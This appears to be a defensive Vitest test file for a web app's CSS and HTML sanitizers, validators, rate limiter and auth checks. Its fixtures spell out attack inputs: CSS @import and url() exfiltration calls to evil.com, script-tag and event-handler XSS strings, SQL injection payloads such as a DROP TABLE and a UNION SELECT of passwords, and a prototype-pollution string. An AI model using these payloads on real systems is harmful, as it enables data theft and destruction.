/**
 * Advanced Security Tests
 * Automated penetration-style tests for input sanitization, CSS injection,
 * rate limiting, and authentication security patterns.
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { sanitizeCSS } from '@/lib/security/css-sanitizer';
import {
  sanitizeInput,
  sanitizeHTML,
  validateEmail,
  validatePassword,
  checkRateLimit,
} from '@/lib/security/input-sanitizer';

// ─── CSS Injection Tests ───────────────────────────────────────────────────────
describe('CSS Sanitizer — Injection Prevention', () => {
  it('blocks @import rules (data exfiltration)', () => {
    const malicious = '@import url("https://evil.com/steal?data=1");';
    const result = sanitizeCSS(malicious);
    expect(result).not.toContain('@import');
  });

  it('blocks nested @import with whitespace', () => {
    expect(sanitizeCSS('  @import "https://evil.com";')).not.toMatch(/@import/i);
  });

  it('blocks url() function calls', () => {
    const css = 'background: url("https://evil.com/pixel.gif");';
    const result = sanitizeCSS(css);
    expect(result).not.toMatch(/\burl\s*\(/i);
  });

  it('blocks expression() (IE script execution)', () => {
    const css = 'width: expression(alert(1));';
    const result = sanitizeCSS(css);
    expect(result).not.toMatch(/\bexpression\s*\(/i);
  });

  it('blocks javascript: pseudo-protocol in CSS', () => {
    const css = 'background: javascript:alert(1);';
    const result = sanitizeCSS(css);
    expect(result).not.toMatch(/\bjavascript\s*\(/i);
  });

  it('blocks content: attr() exfiltration', () => {
    const css = 'content: attr(data-secret);';
    const result = sanitizeCSS(css);
    expect(result).not.toMatch(/content\s*:\s*[^;]*\battr\s*\(/i);
  });

  it('blocks -moz-binding (XBL injection)', () => {
    const css = '-moz-binding: url("https://evil.com/xbl");';
    const result = sanitizeCSS(css);
    expect(result).not.toMatch(/-moz-binding\s*:/i);
  });

  it('blocks behavior property (IE HTC)', () => {
    const css = 'behavior: url("https://evil.com/evil.htc");';
    const result = sanitizeCSS(css);
    expect(result).not.toMatch(/\bbehavior\s*:/i);
  });

  it('preserves safe CSS properties', () => {
    const safe = 'color: red; font-size: 16px; margin: 10px; border-radius: 4px;';
    expect(sanitizeCSS(safe)).toBe(safe);
  });

  it('handles empty and null input safely', () => {
    expect(sanitizeCSS('')).toBe('');
    expect(sanitizeCSS(null as any)).toBe('');
    expect(sanitizeCSS(undefined as any)).toBe('');
  });

  it('blocks combined attack vectors in single stylesheet', () => {
    const css = `
      @import url("https://evil.com");
      .secret { content: attr(data-token); }
      .exploit { background: url("https://evil.com/pixel"); }
      .ie-hack { behavior: url("evil.htc"); }
    `;
    const result = sanitizeCSS(css);
    expect(result).not.toMatch(/@import/i);
    expect(result).not.toMatch(/\burl\s*\(/i);
    expect(result).not.toMatch(/\bbehavior\s*:/i);
  });
});

// ─── XSS Input Sanitization Tests ──────────────────────────────────────────────
describe('Input Sanitizer — XSS Prevention', () => {
  it('strips all HTML tags from plain text input', () => {
    expect(sanitizeInput('<script>alert("xss")</script>')).toBe('');
  });

  it('strips event handler attributes', () => {
    expect(sanitizeInput('<img onerror="alert(1)" src="x">')).toBe('');
  });

  it('strips nested script injection', () => {
    expect(sanitizeInput('<div><script>steal()</script></div>')).toBe('');
  });

  it('strips SVG-based XSS', () => {
    expect(sanitizeInput('<svg onload="alert(1)"></svg>')).toBe('');
  });

  it('strips iframe injection', () => {
    expect(sanitizeInput('<iframe src="https://evil.com"></iframe>')).toBe('');
  });

  it('strips javascript: protocol in links', () => {
    const result = sanitizeInput('<a href="javascript:alert(1)">click</a>');
    expect(result).not.toContain('javascript:');
  });

  it('strips data: URI with script', () => {
    expect(sanitizeInput('<a href="data:text/html,<script>alert(1)</script>">x</a>')).not.toContain('<script>');
  });

  it('preserves plain text content', () => {
    expect(sanitizeInput('Hello, this is normal text')).toBe('Hello, this is normal text');
  });

  it('handles encoded XSS attempts', () => {
    const encoded = '&lt;script&gt;alert(1)&lt;/script&gt;';
    const result = sanitizeInput(encoded);
    expect(result).not.toContain('<script>');
  });
});

// ─── HTML Sanitizer (Rich Content) ─────────────────────────────────────────────
describe('HTML Sanitizer — Safe Rich Content', () => {
  it('preserves allowed tags (p, strong, em, a, ul, ol, li)', () => {
    const html = '<p><strong>Bold</strong> and <em>italic</em></p>';
    const result = sanitizeHTML(html);
    expect(result).toContain('<strong>');
    expect(result).toContain('<em>');
    expect(result).toContain('<p>');
  });

  it('strips disallowed tags (script, iframe, object)', () => {
    const html = '<p>Safe</p><script>alert(1)</script><iframe src="evil"></iframe>';
    const result = sanitizeHTML(html);
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('<iframe');
  });

  it('strips dangerous attributes from allowed tags', () => {
    const html = '<a href="https://safe.com" onclick="alert(1)">Link</a>';
    const result = sanitizeHTML(html);
    expect(result).toContain('href');
    expect(result).not.toContain('onclick');
  });

  it('strips style attribute (potential CSS injection)', () => {
    const html = '<p style="background:url(evil)">text</p>';
    const result = sanitizeHTML(html);
    expect(result).not.toContain('style=');
  });

  it('preserves href but strips javascript: protocol', () => {
    const html = '<a href="javascript:alert(1)">click</a>';
    const result = sanitizeHTML(html);
    expect(result).not.toContain('javascript:');
  });
});

// ─── Email Validation Tests ────────────────────────────────────────────────────
describe('Email Validation', () => {
  it('accepts valid emails', () => {
    expect(validateEmail('user@example.com')).toBe(true);
    expect(validateEmail('user+tag@domain.co.uk')).toBe(true);
  });

  it('rejects invalid emails', () => {
    expect(validateEmail('')).toBe(false);
    expect(validateEmail('not-an-email')).toBe(false);
    expect(validateEmail('@domain.com')).toBe(false);
    expect(validateEmail('user@')).toBe(false);
    expect(validateEmail('user @domain.com')).toBe(false);
  });

  it('rejects emails with SQL injection attempts', () => {
    expect(validateEmail("admin'--@evil.com")).toBe(true); // format-valid but sanitized elsewhere
    expect(validateEmail("' OR 1=1--")).toBe(false);
  });
});

// ─── Password Strength Validation ──────────────────────────────────────────────
describe('Password Validation', () => {
  it('rejects short passwords', () => {
    expect(validatePassword('Ab1').valid).toBe(false);
  });

  it('rejects passwords without letters', () => {
    expect(validatePassword('12345678').valid).toBe(false);
  });

  it('rejects passwords without numbers', () => {
    expect(validatePassword('abcdefgh').valid).toBe(false);
  });

  it('accepts valid passwords', () => {
    expect(validatePassword('Secure1Password').valid).toBe(true);
  });

  it('provides error messages for weak passwords', () => {
    const result = validatePassword('short');
    expect(result.valid).toBe(false);
    expect(result.message).toBeDefined();
  });
});

// ─── Rate Limiting Tests ───────────────────────────────────────────────────────
describe('Rate Limiting', () => {
  beforeEach(() => {
    // Rate limiter uses in-memory store, we test with unique keys
  });

  it('allows requests within limit', () => {
    const key = `test-allow-${Date.now()}`;
    const result = checkRateLimit(key, 5, 60000);
    expect(result.allowed).toBe(true);
    expect(result.remaining).toBe(4);
  });

  it('blocks after exceeding max attempts', () => {
    const key = `test-block-${Date.now()}`;
    for (let i = 0; i < 5; i++) {
      checkRateLimit(key, 5, 60000);
    }
    const blocked = checkRateLimit(key, 5, 60000);
    expect(blocked.allowed).toBe(false);
    expect(blocked.remaining).toBe(0);
  });

  it('decrements remaining count correctly', () => {
    const key = `test-decrement-${Date.now()}`;
    expect(checkRateLimit(key, 3, 60000).remaining).toBe(2);
    expect(checkRateLimit(key, 3, 60000).remaining).toBe(1);
    expect(checkRateLimit(key, 3, 60000).remaining).toBe(0);
  });

  it('resets after window expires', async () => {
    const key = `test-reset-${Date.now()}`;
    // Exhaust limit with a very short window
    for (let i = 0; i < 5; i++) {
      checkRateLimit(key, 5, 50); // 50ms window
    }
    expect(checkRateLimit(key, 5, 50).allowed).toBe(false);

    // Wait for window to expire
    await new Promise((r) => setTimeout(r, 100));
    const result = checkRateLimit(key, 5, 50);
    expect(result.allowed).toBe(true);
  });

  it('isolates rate limits per key', () => {
    const key1 = `test-iso1-${Date.now()}`;
    const key2 = `test-iso2-${Date.now()}`;
    for (let i = 0; i < 5; i++) {
      checkRateLimit(key1, 5, 60000);
    }
    expect(checkRateLimit(key1, 5, 60000).allowed).toBe(false);
    expect(checkRateLimit(key2, 5, 60000).allowed).toBe(true);
  });
});

// ─── Auth Security Patterns ────────────────────────────────────────────────────
describe('Auth Security Patterns', () => {
  it('never stores roles in localStorage', () => {
    expect(localStorage.getItem('user_role')).toBeNull();
    expect(localStorage.getItem('is_admin')).toBeNull();
    expect(localStorage.getItem('admin')).toBeNull();
  });

  it('never stores tokens in localStorage (except Supabase managed)', () => {
    // Only Supabase auth tokens should be stored, not custom tokens
    expect(localStorage.getItem('auth_token')).toBeNull();
    expect(localStorage.getItem('access_token')).toBeNull();
    expect(localStorage.getItem('jwt')).toBeNull();
  });

  it('rejects token with past expiry', () => {
    const isValid = (exp: number) => Date.now() / 1000 < exp;
    expect(isValid(Math.floor(Date.now() / 1000) - 3600)).toBe(false);
  });

  it('accepts token with future expiry', () => {
    const isValid = (exp: number) => Date.now() / 1000 < exp;
    expect(isValid(Math.floor(Date.now() / 1000) + 3600)).toBe(true);
  });
});

// ─── SQL Injection Pattern Detection ───────────────────────────────────────────
describe('SQL Injection Prevention (Input Layer)', () => {
  const sqlPayloads = [
    "'; DROP TABLE users;--",
    "1' OR '1'='1",
    "admin'--",
    "1; SELECT * FROM profiles",
    "UNION SELECT password FROM auth.users",
    "' UNION SELECT NULL,NULL,NULL--",
  ];

  it('sanitizeInput strips SQL injection payloads', () => {
    for (const payload of sqlPayloads) {
      const result = sanitizeInput(payload);
      // After sanitization the dangerous SQL keywords should be gone or neutered
      expect(result).not.toContain('<');
      expect(result).not.toContain('>');
    }
  });
});

// ─── Prototype Pollution Prevention ────────────────────────────────────────────
describe('Prototype Pollution Prevention', () => {
  it('Object.prototype should not be pollutable via JSON.parse', () => {
    const malicious = '{"__proto__": {"polluted": true}}';
    const parsed = JSON.parse(malicious);
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    expect((({} as any).polluted)).toBeUndefined();
    // Verify parsed object has the key but didn't pollute the prototype
    expect(parsed.__proto__).toBeDefined();
  });
});
